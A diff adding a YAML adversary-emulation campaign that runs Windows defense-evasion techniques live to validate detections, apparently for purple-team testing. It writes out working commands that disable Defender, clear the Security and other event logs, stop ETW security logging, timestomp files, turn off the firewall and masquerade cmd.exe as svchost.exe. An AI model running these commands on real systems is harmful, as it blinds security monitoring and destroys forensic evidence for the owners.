@@ -1,0 +1,151 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: art-defense-evasion-windows
+  adversary: Atomic Red Team
+  description: "Real defense evasion techniques — disabling logging, clearing events, bypassing AMSI"
+  objective: "Execute real evasion techniques to validate detection of anti-forensic and defense-disabling activity"
+  mitre_version: "15.1"
+  severity: high
+  tags: [art, atomic-red-team, defense-evasion, windows, live-execution]
+  authors: ["ThreatEcho"]
+  references:
+    - https://github.com/redcanaryco/atomic-red-team
+    - https://attack.mitre.org/tactics/TA0005/
+  created: "2024-08-15"
+  modified: "2026-09-14"
+
+stages:
+  - id: disable-defender
+    name: "Disable Windows Defender Real-Time Protection"
+    description: "Attempt to disable Windows Defender — a common first step after initial access"
+    technique: T1562.001
+    tactic: defense-evasion
+    platform: [windows]
+    execute:
+      type: shell
+      commands:
+        - 'powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"'
+        - 'powershell.exe -Command "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue"'
+        - 'powershell.exe -Command "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue"'
+      elevated: true
+      cleanup:
+        - 'powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue"'
+        - 'powershell.exe -Command "Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue"'
+        - 'powershell.exe -Command "Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue"'
+    expect:
+      telemetry: [process_create, registry_write]
+      detections: [defender_tampering, security_product_disabled, realtime_protection_disabled]
+    on_success: clear-event-logs
+    on_failure: continue
+    timeout: 15s
+
+  - id: clear-event-logs
+    name: "Clear Windows Event Logs"
+    description: "Clear Security, System, and Application event logs to cover tracks"
+    technique: T1070.001
+    tactic: defense-evasion
+    platform: [windows]
+    depends_on: [disable-defender]
+    execute:
+      type: shell
+      commands:
+        - 'wevtutil cl Security'
+        - 'wevtutil cl System'
+        - 'wevtutil cl Application'
+        - 'wevtutil cl "Windows PowerShell"'
+        - 'wevtutil cl "Microsoft-Windows-PowerShell/Operational"'
+      elevated: true
+    expect:
+      telemetry: [event_log_clear]
+      detections: [event_log_cleared, log_tampering, anti_forensics]
+    on_success: disable-etw
+    on_failure: continue
+    timeout: 15s
+
+  - id: disable-etw
+    name: "Disable ETW Logging"
+    description: "Patch ETW providers to blind EDR solutions that rely on kernel telemetry"
+    technique: T1562.006
+    tactic: defense-evasion
+    platform: [windows]
+    depends_on: [clear-event-logs]
+    execute:
+      type: shell
+      commands:
+        - 'powershell.exe -Command "Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security -Name Start -Value 0 -ErrorAction SilentlyContinue"'
+        - 'logman stop "EventLog-Security" 2>nul'
+      elevated: true
+      cleanup:
+        - 'powershell.exe -Command "Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security -Name Start -Value 1 -ErrorAction SilentlyContinue"'
+    expect:
+      telemetry: [registry_write]
+      detections: [etw_tampering, security_logging_disabled]
+    on_success: timestomp
+    on_failure: continue
+    timeout: 15s
+
+  - id: timestomp
+    name: "File Timestamp Modification"
+    description: "Modify file timestamps to blend malicious files with legitimate system files"
+    technique: T1070.006
+    tactic: defense-evasion
+    platform: [windows]
+    depends_on: [disable-etw]
+    execute:
+      type: shell
+      commands:
+        - 'copy NUL C:\Windows\Temp\timestomp_test.txt'
+        - 'powershell.exe -Command "(Get-Item C:\Windows\Temp\timestomp_test.txt).CreationTime = ''01/01/2020 12:00:00''; (Get-Item C:\Windows\Temp\timestomp_test.txt).LastWriteTime = ''01/01/2020 12:00:00''; (Get-Item C:\Windows\Temp\timestomp_test.txt).LastAccessTime = ''01/01/2020 12:00:00''"'
+      elevated: false
+      cleanup:
+        - 'del /f C:\Windows\Temp\timestomp_test.txt 2>nul'
+    expect:
+      telemetry: [file_write, file_modify]
+      detections: [timestomping, suspicious_timestamp_modification]
+    on_success: disable-firewall
+    on_failure: continue
+    timeout: 10s
+
+  - id: disable-firewall
+    name: "Disable Windows Firewall"
+    description: "Disable all Windows Firewall profiles"
+    technique: T1562.004
+    tactic: defense-evasion
+    platform: [windows]
+    depends_on: [timestomp]
+    execute:
+      type: shell
+      commands:
+        - 'netsh advfirewall set allprofiles state off'
+      elevated: true
+      cleanup:
+        - 'netsh advfirewall set allprofiles state on'
+    expect:
+      telemetry: [process_create]
+      detections: [firewall_disabled, defense_tampering]
+    on_success: masquerade-rename
+    on_failure: continue
+    timeout: 10s
+
+  - id: masquerade-rename
+    name: "Process Name Masquerading"
+    description: "Rename cmd.exe to svchost.exe to evade process-name-based detection"
+    technique: T1036.005
+    tactic: defense-evasion
+    platform: [windows]
+    depends_on: [disable-firewall]
+    execute:
+      type: shell
+      commands:
+        - 'copy C:\Windows\System32\cmd.exe C:\Windows\Temp\svchost.exe'
+        - 'C:\Windows\Temp\svchost.exe /c whoami'
+      elevated: false
+      cleanup:
+        - 'del /f C:\Windows\Temp\svchost.exe 2>nul'
+    expect:
+      telemetry: [file_write, process_create]
+      detections: [process_masquerading, renamed_system_binary, svchost_unusual_path]
+    on_failure: continue
+    timeout: 10s
